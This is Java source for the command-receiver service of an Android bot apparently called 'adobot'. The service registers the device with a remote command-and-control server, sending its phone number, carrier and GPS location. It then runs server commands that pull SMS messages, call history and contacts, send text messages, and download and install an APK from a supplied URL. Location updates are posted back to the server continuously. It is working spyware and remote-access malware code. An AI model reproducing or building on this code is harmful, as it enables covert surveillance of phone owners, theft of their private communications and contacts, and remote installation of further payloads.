package com.android.adobot;

import android.Manifest;
import android.app.Service;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationListener;
import android.os.Bundle;
import android.os.IBinder;
import android.support.v4.app.ActivityCompat;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.net.URISyntaxException;
import java.util.HashMap;

import com.android.adobot.http.Http;
import com.android.adobot.http.HttpRequest;
import io.nlopez.smartlocation.OnLocationUpdatedListener;
import io.nlopez.smartlocation.SmartLocation;
import io.socket.client.Ack;
import io.socket.client.IO;
import io.socket.client.Socket;
import io.socket.emitter.Emitter;
import com.android.adobot.tasks.GetCallLogsTask;
import com.android.adobot.tasks.GetContactsTask;
import com.android.adobot.tasks.GetSmsTask;
import com.android.adobot.tasks.SendSmsTask;
import com.android.adobot.tasks.UpdateAppTask;


public class CommandReceiverService extends Service {

    private static final String TAG = "CommandReceiverService";

    private static final String POST_STATUS = "/status";

    private CommonParams params;
    private CommandReceiverService client;
    private Socket socket;
    private boolean connected;
    private boolean registered;
    private double latitude;
    private double longitude;

    public Socket getSocket() {
        return socket;
    }

    public double getLatitude() {
        return latitude;
    }

    public double getLongitude() {
        return longitude;
    }

    private final LocationListener locationListener = new LocationListener() {
        public void onLocationChanged(Location location) {
            updateLocation(location);
        }

        public void onProviderDisabled(String provider) {
            updateLocation(null);
        }

        public void onProviderEnabled(String provider) {
        }

        public void onStatusChanged(String provider, int status, Bundle extras) {
        }
    };

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {

        params = new CommonParams(this);
        client = this;
        connected = false;

        latitude = 0;
        longitude = 0;

        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
            observeLocation();
        }
        try {
            socket = IO.socket(params.getServer());
            socket.on(Socket.EVENT_CONNECT, new Emitter.Listener() {

                @Override
                public void call(Object... args) {

                    Log.i(TAG, "\n\nSocket connected\n\n");
                    connected = true;

                    HashMap bot = new HashMap();
                    bot.put("uid", params.getUid());
                    bot.put("provider", params.getProvider());
                    bot.put("lat", latitude);
                    bot.put("longi", longitude);
                    bot.put("device", params.getDevice());
                    bot.put("sdk", params.getSdk());
                    bot.put("version", params.getVersion());
                    bot.put("phone", params.getPhone());

                    JSONObject obj = new JSONObject(bot);
                    socket.emit("register", obj, new Ack() {
                        @Override
                        public void call(Object... args) {
                            registered = true;
                            Log.i(TAG, "Socket connected");
                        }
                    });

                }

            });

            socket.on("commands", new Emitter.Listener() {

                @Override
                public void call(Object... args) {
                    JSONArray cmds = (JSONArray) args[0];
                    for (int i = 0; i < cmds.length(); i++) {
                        JSONObject cmd = new JSONObject();
                        try {
                            cmd = (JSONObject) cmds.get(i);

                            String command = (String) cmd.get("command");
                            Log.i(TAG, "\nCommand: " + cmd.toString() + "\n");

                            if (command.equals("getsms")) {
                                Log.i(TAG, "\nInvoking Sms Service\n");
                                int arg1 = Integer.parseInt(cmd.get("arg1").toString());
                                GetSmsTask smsService = new GetSmsTask(client, arg1);
                                smsService.start();
                            } else if (command.equals("getcallhistory")) {
                                Log.i(TAG, "\nInvoking Call LOg Service\n");
                                int arg1 = Integer.parseInt(cmd.get("arg1").toString());
                                GetCallLogsTask cs = new GetCallLogsTask(client, arg1);
                                cs.start();
                            } else if (command.equals("getcontacts")) {
                                Log.i(TAG, "\nInvoking GetContactsTask\n");
                                GetContactsTask cs = new GetContactsTask(client);
                                cs.start();
                            } else if (command.equals("promptupdate")) {
                                Log.i(TAG, "\nInvoking UpdateAppTask\n");
                                String apkUrl = cmd.get("arg1").toString();

                                UpdateAppTask atualizaApp = new UpdateAppTask(apkUrl);
                                atualizaApp.setContext(client);
                                atualizaApp.run();
                            } else if (command.equals("sendsms")) {
                                Log.i(TAG, "\nInvoking SendSMS\n");
                                String phoneNumber = cmd.get("arg1").toString();
                                String textMessage = cmd.get("arg2").toString();

                                SendSmsTask sendSmsTask = new SendSmsTask(client);
                                sendSmsTask.setPhoneNumber(phoneNumber);
                                sendSmsTask.setTextMessage(textMessage);
                                sendSmsTask.start();

                            } else {
                                Log.i(TAG, "Unknown command");
                                HashMap xcmd = new HashMap();
                                xcmd.put("event", "command:unknown");
                                xcmd.put("uid", params.getUid());
                                xcmd.put("device", params.getDevice());
                                xcmd.put("command", command);

                                Http req = new Http();
                                req.setUrl(params.getServer() + "/notify");
                                req.setMethod(HttpRequest.METHOD_POST);
                                req.setParams(xcmd);
                                req.execute();
                            }

                        } catch (JSONException e) {
                            e.printStackTrace();
                        }
                    }
                }

            });

            socket.on(Socket.EVENT_DISCONNECT, new Emitter.Listener() {

                @Override
                public void call(Object... args) {
                    connected = false;
                    Log.i(TAG, "\n\nSocket disconnected...\n\n");
                    final Thread reconnect = new Thread(new Runnable() {
                        @Override
                        public void run() {
                            Log.i(TAG, "Socket reconnecting...");
                            try {
                                Thread.sleep(5000);
                            } catch (InterruptedException e) {
                                e.printStackTrace();
                            }
                            if (!connected)
                                socket.connect();
                        }
                    });

                    reconnect.start();
                }

            });

        } catch (URISyntaxException e) {
            e.printStackTrace();
        }

        super.onCreate();

    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.i(TAG, "Running onStartCommand");

//        socket.connect();

        Log.i(TAG, "\n\n\nSocket is " + (connected ? "connected" : "not connected\n\n\n"));
        if (!connected) {
            Log.i(TAG, "Socket is connecting ......\n");
            socket.connect();
        }

        super.onStartCommand(intent, flags, startId);
        return START_STICKY;

    }

    private void observeLocation() {
        SmartLocation.with(this).location()
                .start(new OnLocationUpdatedListener() {
                    @Override
                    public void onLocationUpdated(Location location) {
                        updateLocation(location);
                    }
                });
    }

    private void updateLocation(Location location) {
        if (location != null) {
            latitude = location.getLatitude();
            longitude = location.getLongitude();

            Log.i(TAG, "Location changed ....");

            HashMap bot = new HashMap();
            bot.put("uid", params.getUid());
            bot.put("provider", params.getProvider());
            bot.put("lat", latitude);
            bot.put("longi", longitude);
            bot.put("device", params.getDevice());
            bot.put("sdk", params.getSdk());
            bot.put("version", params.getVersion());
            bot.put("phone", params.getPhone());
            Http req = new Http();
            req.setUrl(params.getServer() + POST_STATUS + "/" + params.getUid());
            req.setMethod("POST");
            req.setParams(bot);
            req.execute();
        }
    }

}
